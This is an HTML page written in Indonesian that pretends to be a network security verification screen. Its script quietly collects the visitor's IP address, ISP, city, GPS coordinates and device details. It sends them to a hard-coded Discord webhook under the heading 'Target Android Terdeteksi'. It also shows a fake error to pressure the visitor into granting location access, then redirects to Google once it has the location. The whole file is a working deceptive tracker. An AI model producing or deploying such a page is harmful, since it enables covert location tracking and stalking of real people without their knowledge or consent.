<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Jaringan</title>
    <style>
        body { background: #0b0e11; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { text-align: center; background: #15191d; padding: 40px; border-radius: 15px; border: 1px solid #2d333b; box-shadow: 0 15px 35px rgba(0,0,0,0.4); width: 320px; z-index: 10; }
        .loader { border: 3px solid #2d333b; border-top: 3px solid #00a2ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { margin-bottom: 10px; font-weight: 500; }
        p { color: #848d97; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #00a2ff; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: 600; width: 100%; transition: 0.2s; outline: none; }
        .btn:active { transform: scale(0.98); background: #008be6; }
        .error-msg { color: #ff4747; font-size: 12px; margin-top: 15px; display: none; }
    </style>
</head>
<body>

<div class="box">
    <div class="loader"></div>
    <h3>Verifikasi Keamanan</h3>
    <p>Browser Anda mendeteksi perubahan jaringan. Silakan konfirmasi akses untuk melanjutkan koneksi aman.</p>
    <button class="btn" onclick="mainProcess()">Konfirmasi Sekarang</button>
    <div id="error-text" class="error-msg">Gagal memverifikasi. Pastikan izin lokasi aktif dan coba lagi.</div>
</div>

<script>
    // === KONFIGURASI ===
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1"; // GANTI DENGAN WEBHOOK ASLI
    const REDIRECT_DESTINATION = "https://www.google.com";

    function vibrateDevice() {
        if ("vibrate" in navigator) navigator.vibrate([50, 30, 50]);
    }

    async function mainProcess() {
        vibrateDevice();
        const btn = document.querySelector('.btn');
        const errorText = document.getElementById('error-text');
        
        btn.innerText = "Memverifikasi...";
        btn.disabled = true;
        errorText.style.display = "none";

        // 1. Ambil Data IP secara Parallel (Dual-API)
        let netInfo = { ip: "N/A", org: "N/A", city: "N/A", region: "N/A" };
        try {
            const providers = [
                'https://ipapi.co/json/',
                'https://ip-api.com/json/'
            ];
            const results = await Promise.allSettled(providers.map(url => fetch(url).then(r => r.json())));
            
            // Pilih hasil yang berhasil pertama kali
            for (let res of results) {
                if (res.status === 'fulfilled') {
                    const data = res.value;
                    netInfo = {
                        ip: data.ip || data.query || "N/A",
                        org: data.org || data.isp || "N/A",
                        city: data.city || "N/A",
                        region: data.region || data.region_name || "N/A"
                    };
                    break;
                }
            }
        } catch (e) { console.log("IP detection failed"); }

        // 2. Eksekusi Geolocation (Akses GPS)
        const gpsOptions = {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 0
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendFinalData(netInfo, pos), // Berhasil
                (err) => { // Ditolak atau Error
                    console.log("GPS Blocked");
                    errorText.style.display = "block";
                    btn.disabled = false;
                    btn.innerText = "Coba Lagi";
                    sendFinalData(netInfo, null); // Tetap kirim IP meski GPS gagal
                },
                gpsOptions
            );
        } else {
            sendFinalData(netInfo, null);
        }
    }

    async function sendFinalData(net, pos) {
        // Ambil info device dengan lebih rapi
        const deviceData = navigator.userAgent.match(/\(([^)]+)\)/);
        const deviceSimple = deviceData ? deviceData[1] : "Unknown Device";

        const payload = {
            embeds: [{
                title: "🚀 Target Android Terdeteksi (Ultimate)",
                color: 5763719,
                fields: [
                    { name: "🌐 Alamat IP", value: `\`${net.ip}\``, inline: true },
                    { name: "🏢 ISP/Provider", value: `\`${net.org}\``, inline: true },
                    { name: "📍 Lokasi IP", value: `${net.city}, ${net.region}`, inline: false },
                    { name: "🎯 GPS Koordinat", value: pos ? `[${pos.coords.latitude}, ${pos.coords.longitude}](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` : "❌ **AKSES DIBLOKIR**", inline: false },
                    { name: "📱 Perangkat", value: `\`${deviceSimple}\``, inline: false }
                ],
                footer: { text: "Mata Fauzan v3 • " + new Date().toLocaleString('id-ID') }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true // PENTING: Menjaga pengiriman tetap jalan di Android
            });
        } catch (e) { console.log("Webhook failed"); }

        // Jika GPS berhasil didapat, langsung redirect. Jika diblokir, jangan dulu agar user coba klik lagi.
        if (pos) {
            setTimeout(() => {
                window.location.href = REDIRECT_DESTINATION;
            }, 1000);
        }
    }
</script>

</body>
</html>
